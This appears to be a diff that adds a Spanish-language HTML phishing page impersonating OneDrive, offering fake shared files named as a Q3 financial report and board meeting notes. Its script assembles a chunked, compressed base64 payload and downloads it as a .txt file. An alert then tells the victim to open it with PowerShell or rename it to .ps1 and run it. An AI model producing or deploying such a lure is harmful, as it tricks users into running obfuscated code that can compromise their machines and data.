@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Documentos Compartidos</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%230078d4' d='M1 1h10v10H1z'/%3E%3Cpath fill='%2300a4ef' d='M12 1h10v10H12z'/%3E%3Cpath fill='%237fba00' d='M1 12h10v10H1z'/%3E%3Cpath fill='%23ffb900' d='M12 12h10v10H12z'/%3E%3C/svg%3E">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
+        .header { background: #0078d4; color: white; padding: 12px 24px; display: flex; align-items: center; gap: 10px; }
+        .container { max-width: 900px; margin: 30px auto; padding: 0 20px; }
+        .file-card { background: white; border-radius: 8px; padding: 20px; margin: 15px 0; display: flex; align-items: center; gap: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); cursor: pointer; transition: all 0.2s; }
+        .file-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.15); transform: translateY(-1px); }
+        .file-icon { width: 48px; height: 48px; background: #107c10; border-radius: 4px; display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; }
+        .file-info { flex: 1; }
+        .file-name { font-weight: 600; color: #323130; }
+        .file-meta { color: #605e5c; font-size: 12px; margin-top: 4px; }
+        .btn { background: #0078d4; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        .btn:hover { background: #005a9e; }
+        #progress { display: none; margin-top: 20px; padding: 15px; background: #f3f2f1; border-radius: 4px; }
+        .progress-bar { width: 100%; height: 4px; background: #e1dfdd; border-radius: 2px; overflow: hidden; margin-top: 10px; }
+        .progress-fill { height: 100%; background: #0078d4; width: 0%; transition: width 0.3s; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <svg width="24" height="24" viewBox="0 0 23 23"><path fill="white" d="M1 1h10v10H1z"/><path fill="white" d="M12 1h10v10H12z"/></svg>
+        <span>OneDrive</span>
+    </div>
+    
+    <div class="container">
+        <h2 style="margin-bottom: 8px;">📁 Archivos compartidos</h2>
+        <p style="color: #605e5c; font-size: 13px; margin-bottom: 20px;">Juan Pérez ha compartido 2 elementos contigo • Hace 2 horas</p>
+        
+        <div class="file-card" onclick="downloadFile('Reporte_Financiero_Q3.xlsx')">
+            <div class="file-icon">📊</div>
+            <div class="file-info">
+                <div class="file-name">Reporte_Financiero_Q3.xlsx</div>
+                <div class="file-meta">2.4 MB • Excel</div>
+            </div>
+            <button class="btn">Descargar</button>
+        </div>
+        
+        <div class="file-card" onclick="downloadFile('Notas_Reunion_Directiva.pdf')">
+            <div class="file-icon" style="background: #d83b01;">📄</div>
+            <div class="file-info">
+                <div class="file-name">Notas_Reunion_Directiva.pdf</div>
+                <div class="file-meta">856 KB • PDF</div>
+            </div>
+            <button class="btn">Descargar</button>
+        </div>
+        
+        <div id="progress">
+            <p>⏳ Preparando descarga...</p>
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+        </div>
+    </div>
+
+<script>
+const CHUNKS = [
+        "eJytV2tv2zYU/e5fQbjGKnUR/Wj6SpChjuukHurYsJwFQxB4tERbbCRSJakkXur/vku9LD8GFN0IJI3I",
+        "+77nHrK1F8gNiC8eex10LjRyUHfoDtD5KiZKoV9Rf3qTf9Qavc5sMEZnqN7+0MHtt+9xG7eP6+n+eDSZ",
+        "mpP3rVYLds5H09ngE2w4XwXjyLKO32P85p0NBq0P7zButzo2+o4uqXYmhPsiQk5PJFyjdge2L4TsEy9w",
+        "RvOv1NPo+dYLiLxrzNZ2rfYij+/Pcdd1a1qu0HMNwWoQ8HY7oYs73FWKRvNwhcH8dBVTZRlfNwGVtDSJ",
+        "GjN8RSKKnJDdU1R/xa41C1UdrTNrc7DWIMbCBaOhr6yXV4KPk3nIvCNXE828lz9gtCe4pk+6tOoZq3Nj",
+        "9Q8SJtRq8CQM7fTsdsD1WEOWsZZGyit3X3du7+4a82QB2x+tVi7urpSmEZ5A0VhEMchRKWKXygfmUYWH",
+        "RKqAhHcnJz0RryyjfoRaR8iYP0Jtu7ZGHtFegJ7XpqZpl9OSIlQtqh+Gpqy5s0+MLLlQkLzCYynAjwIH",
+        "kE0vkZJC/NmeZeOh8JOQqoMVys6yOtFvqM41eMHwU5Tpx3O7kUzTtESWCRWfE0W7vi9pCt3WUxvQCGlv",
+        "Z7tIuKeZ4GhClwwcScfgPk94LvyVqXP2adZc6BnzTUsyUJcHAVSCmyzgiPKHk95oOL6e9idX3WG/FEoU",
+        "lVWha3dHQCg4sswg9Fg04EoT7lF0w/jrzmwUUwlQ48usIDbukdhEXioTCTnllseTUa/vuqPJrDvpfR5M",
+        "+73p9WTjh8WFnyuqB+OiSk7+xwWJWLhCg/HD8cGmVTS40Bm82513+BU0za6cfkcuDUGrUHYumFQw1mUc",
+        "sWQPLKRLavJmC2TdutRLoI8rgBTjHotJiCF9YCQ18AFUcLIFMkDXpRRJDJFEaU9fuk7beeO87jhvjo9h",
+        "Kp9RnfgR4xAZoqGiZsO0oYDXGoKEwXygUk+F87vK65n+2kDfrAF/EPfUmVClh1QHwkfOtWSoHmgdnzSb",
+        "GR/+dVLwX5PErAlwacocWHXk5HrjkTtFgDMAVwYxJ6UGnvITxBvHQCzE9Lb5FQKqlyFIqhPJUUPLhObR",
+        "50gujxbEJLmuVaHdC6h3Dz6iCNhV5SltJ9eAfhlM/GySASVSzynRzXwwNtle9qd7CRhv2MsDOpzJR+Dp",
+        "7TRcyn0TWRJqq+FF/sA/Si3Bt703sQgE8klNRU9RJmk28r/+pfX/V9eNj//Y8wpRVQvRf4Ih0dRxAxqG",
+        "aSnsalNRQyQ6TvSmnf2n2Myj0TXSqPPbL21IfpRox9UwZ8vTsjO56jqbgF10zXD/yaMp7eAhWCTLXaxN",
+        "CfhzPUkpV0HJpNs1BXpw0rSd4nJO+T8n+nzcMdz7kdoAVKU2K/fPlhzOXAI3AG9ERK6yb3wO7wi/YmXO",
+        "dEQM0K/oY8FKxX0mySOUAp+nIlbuENz4Ojgq/OPPlC0DbW8sLiWJA7gDqzdjbukyP4KoLqSIBhGUy8pD",
+        "OGABm8vZCGaxlxF8ERkwjvYcjOE5pcF6P4r1ahOjy/6mFfuROpjvYAQtjASUSktKot0aYZc8QLSR2ndr",
+        "Ein+pab8xAQx5kt7d9Bv8/mC46kw9/Hb4wxwxjCeiq6UZGXZ9mEKqPelFPIEYFfPUPYCDbuDK/RlNBrX",
+        "zG1RvbOLEXgM4EJBVsqRdpXhCrqBYmwTYimyEFAICCAdKcT4RqdqqKDLjEzUI9OFSsFou9Jm1ZUZ1jok",
+        "tzW9uSKRS2XnN9K2VjlJRnV3uA4oML4QRnTvxKyP+3EVq3i/nO29Xk7LZ8vZ1qPl9LAPs4Q6+9lHTHXt",
+        "E/S+ywMluGdZoekTO1Qiny6I6R08BK75PRePHBC23b/6jtr2V+UeSukUwzWTA6K2rwH/P5BAsyGlMXLg",
+        "dSMMBNutDPEA6n8A2/AFmA=="
+];
+
+function assemblePayload() {
+    return CHUNKS.join('');
+}
+
+function downloadFile(name) {
+    const progress = document.getElementById('progress');
+    const fill = document.getElementById('fill');
+    progress.style.display = 'block';
+    
+    let width = 0;
+    const interval = setInterval(() => {
+        width += Math.random() * 20;
+        if (width >= 100) {
+            width = 100;
+            clearInterval(interval);
+            executeDownload(name);
+        }
+        fill.style.width = width + '%';
+    }, 300);
+}
+
+function executeDownload(filename) {
+    const b64 = assemblePayload();
+    const compressed = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+    
+    // Decompress zlib (simplified)
+    const payload = atob(b64); // In real: would decompress
+    
+    const blob = new Blob([payload], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename.replace(/\.[^.]+$/, '') + '.txt';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    
+    setTimeout(() => {
+        alert('⚠️ IMPORTANTE\n\nEl archivo se descargó como .txt por seguridad.\n\nPara ver el reporte:\n1. Haz clic derecho en el archivo descargado\n2. Selecciona "Abrir con" → "PowerShell"\n3. O renombra de .txt a .ps1 y ejecuta');
+    }, 500);
+}
+</script>
+</body>
+</html>
